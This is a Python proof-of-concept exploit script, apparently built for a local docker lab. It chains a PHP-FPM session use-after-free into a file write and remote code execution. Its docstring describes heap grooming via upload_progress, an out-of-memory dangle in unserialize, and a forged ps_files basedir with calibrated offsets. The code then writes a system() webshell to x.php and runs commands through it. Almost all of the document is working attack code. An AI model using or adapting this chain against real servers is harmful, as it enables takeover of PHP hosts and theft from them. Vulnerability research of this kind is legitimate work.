#!/usr/bin/env python3 -I
# INDEX: session-uaf file-write rce | fpm | pure | session_start() | minor+ | upload_progress cleanup=on, writable docroot
"""Pure-HTTP session-UAF -> file-write RCE for the `upc` lab (stock PHP 8.3.26-fpm,
session.upload_progress.cleanup=On). No docker exec and no gdb on the target.

    docker compose -f docker-compose.versions.yml --profile upc8332 up -d --build   # 8.3.26, 32M
    docker compose -f docker-compose.versions.yml --profile upc83   up -d --build   # 8.3.26, 512M
    python3 -I poc/chains/upc_rce_singleshot.py            # CP_URL=http://127.0.0.1:8195 (upc83)

Composition (CVE-2026-109619, three HTTP phases to nginx; this chain is thin orchestration over
the primitives):
  grow()  groom.upload_progress_accumulate -- accumulate the session file one record at a time;
          each record's trailing empty-filename wall OOMs the parser after its FILE_START flush, so
          cleanup=On never deletes it.
  arm()   groom.nested_field_prime -- POST a nested-field prime to /index.php (script-level
          session_start); its decode of the grown file OOMs in php_var_unserialize, leaving
          BG(unserialize) dangling while zend_first_try keeps the worker alive.
  stage() write.ps_files_basedir_forge + write.fresh_dtor_placement build the carrier, and
          write.basedir_write_stage delivers it: the forged ps_files->basedir makes a trailing
          $_FILES part's FILE_START flush write the session (a webshell in an upload_progress key)
          to x.php. oracles.upload_progress_output reads back GET x.php?0=<cmd>.

Forge offsets are chunk-relative (K = the 2 MB-aligned Zend MM request chunk; ASLR-independent,
fork-stable) and calibrated off-target on the :gdb profile, never read at exploit time. The
defaults are the 8.4.26 calibration (where forge+write+trigger is HTTP-proven); the 8.3.26 forge
port (its reliable arm leaves the INLINE var_entries, so the forge needs the separate-block
geometry) is open calibration.

Preconditions: session.upload_progress.{enabled,cleanup}=On, use_strict_mode=On, a world-writable
docroot, and a worker that survives the arm OOM (zend_first_try, memory_limit headroom).

State: the stage lands uid=33 given an armed worker on 8.4.26 offsets. The pure-HTTP arm is
reproducible on 8.3.26 but not on 8.4.26 (its cheaper nested parse OOMs pre-RINIT -> worker exit 70).
The open step is porting the offset-free forge to 8.3.26's dangle geometry.
"""
import os
import sys
import time
from http.client import HTTPConnection

_POC_ROOT = os.path.dirname(os.path.dirname(os.path.abspath(__file__)))  # poc/
if _POC_ROOT not in sys.path:
    sys.path.insert(0, _POC_ROOT)
from primitives.write import ps_files_basedir_forge as forge  # noqa: E402
from primitives.geometry import carrier_e_gap  # noqa: E402
from primitives.write import fresh_dtor_placement  # noqa: E402
from primitives.write.basedir_write_stage import stage_parts  # noqa: E402
from primitives.groom.upload_progress_accumulate import record_parts  # noqa: E402
from primitives.groom.nested_field_prime import prime_parts  # noqa: E402
from primitives.oracles.upload_progress_output import webshell_output  # noqa: E402

URL = os.environ.get("CP_URL", "http://127.0.0.1:8195").rstrip("/")  # upc83 (8.3.26, 512M)
CMD = os.environ.get("CP_CMD", "id")
WEBPATH = os.environ.get("CP_PATH", "/var/www/html/x.php").encode() + b"\x00"
SHELL = b"<?php system($_GET[0]);?>"
LIMIT = int(os.environ.get("CP_LIMIT", str(32 * 1024 * 1024)))
BND = b"BNDupc"

# calibrated 8.4.26 forge offsets (chunk-relative, K-free; see header)
E_OFF = int(os.environ.get("CP_E", "0xaa000"), 0)
# DT default derives from E via the fresh-dtor-block stride; CP_DT still overrides.
DT_OFF = int(os.environ.get("CP_DT", hex(carrier_e_gap.dt_from_e(E_OFF, "fresh_dtor_block"))), 0)
PS_FILES_OFF = int(os.environ.get("CP_PF", "0x56208"), 0)
AIM_U = forge.aim_used_slots(PS_FILES_OFF, E_OFF)
CARRIER_E = E_OFF - DT_OFF                            # fresh_dtor_block gap 0x42000 by default
FZ_OFF = int(os.environ.get("CP_FZ", "0x1030"), 0)   # fresh-dtor-block data[2]
SZ = int(os.environ.get("CP_SZ", "0x60000"), 0)
NFIELD = int(os.environ.get("CP_NFIELD", "2"))
FLEN = int(os.environ.get("CP_FLEN", "50"))

RWALL = int(os.environ.get("CP_RWALL", "1000"))      # per-record parser-OOM wall (persist)
FNLEN = int(os.environ.get("CP_FNLEN", "400000"))    # record filename length (session growth)
NREC = int(os.environ.get("CP_NREC", "26"))
PRIMEN = int(os.environ.get("CP_PRIMEN", "3200"))    # prime field pressure
ATTEMPTS = int(os.environ.get("CP_ATTEMPTS", "8"))

_host = URL.split("://", 1)[1]
HOST, _, _port = _host.partition(":")
PORT = int(_port or "80")
CT = "multipart/form-data; boundary=" + BND.decode()


def multipart(parts):
    """Encode (name, value, filename|None) part tuples to the wire body (filename parts
    carry Content-Type: application/octet-stream)."""
    out = bytearray()
    for name, val, fn in parts:
        out += b"--" + BND + b'\r\nContent-Disposition: form-data; name="' + name + b'"'
        if fn is not None:
            out += b'; filename="' + fn + b'"\r\nContent-Type: application/octet-stream'
        out += b"\r\n\r\n" + val + b"\r\n"
    out += b"--" + BND + b"--\r\n"
    return bytes(out)


def req(method, path, body=None, cookie=None, timeout=60):
    for _ in range(60):
        try:
            c = HTTPConnection(HOST, PORT, timeout=timeout)
            h = {}
            if body is not None:
                h["Content-Type"] = CT
                h["Content-Length"] = str(len(body))
            if cookie:
                h["Cookie"] = cookie
            c.request(method, path, body=body, headers=h)
            r = c.getresponse()
            data = r.read()
            st, sc = r.status, r.getheader("Set-Cookie")
            c.close()
            return st, sc, data
        except (ConnectionError, OSError):
            time.sleep(0.1)
    return -1, None, b""


def wait():
    for _ in range(100):
        if req("GET", "/pid.php")[0] == 200:
            return
        time.sleep(0.1)


def mint():
    """use_strict_mode=On rejects an unknown id; a script-level session_start mints a valid one
    and sends it in Set-Cookie, creating the on-disk file so later records are accepted."""
    _, sc, _ = req("GET", "/index.php")
    for p in (sc or "").split(";"):
        p = p.strip()
        if p.startswith("PHPSESSID="):
            return p.split("=", 1)[1]
    return None


def build_carrier():
    """Carrier that re-occupies the freed E/DT blocks: fresh-dtor placement of the fake basedir
    backing + the two-push aim at ps_files->{last_key, basedir}."""
    car = bytearray(SZ)
    fresh_dtor_placement.place(car, WEBPATH, fz=FZ_OFF)
    forge.aim_pushes(car, CARRIER_E, AIM_U)
    return bytes(car)


def grow(sid):
    """Accumulate the session file over upload-progress records (cleanup beaten by the
    trailing wall's parser-OOM-after-flush)."""
    for i in range(NREC):
        req("POST", "/plain.php", multipart(record_parts(i, FNLEN, RWALL)), "PHPSESSID=" + sid)
        wait()


def arm(sid):
    """Script-level session_start on the grown file; the prime tips its decode into OOM."""
    req("POST", "/index.php", multipart(prime_parts(PRIMEN)), "PHPSESSID=" + sid)


def stage(stage_sid, car):
    """Re-occupy the freed blocks with the forged carrier, trigger the flush, read the shell."""
    req("POST", "/plain.php", multipart(stage_parts(car, SHELL, nfield=NFIELD, flen=FLEN)),
        "PHPSESSID=" + stage_sid)
    time.sleep(0.2)
    return req("GET", "/x.php?0=" + CMD)


def main():
    print("[upc] %s AIM_U=%d FZ=%#x cleanup=On (pure-HTTP)" % (URL, AIM_U, FZ_OFF), flush=True)
    car = build_carrier()
    for a in range(1, ATTEMPTS + 1):
        wait()
        sid = mint()
        if not sid:
            print("[upc] mint failed"); continue
        grow(sid)
        arm(sid)
        st, _, body = stage(sid, car)
        out = webshell_output(body)
        if "uid=" in out:
            print("[upc][attempt %d] PROOF: %s" % (a, out), flush=True)
            return 0
        print("[upc][attempt %d] no shell (arm dangle not established over HTTP on this "
              "memory_limit -- see header)" % a, flush=True)
    return 1


if __name__ == "__main__":
    sys.exit(main())
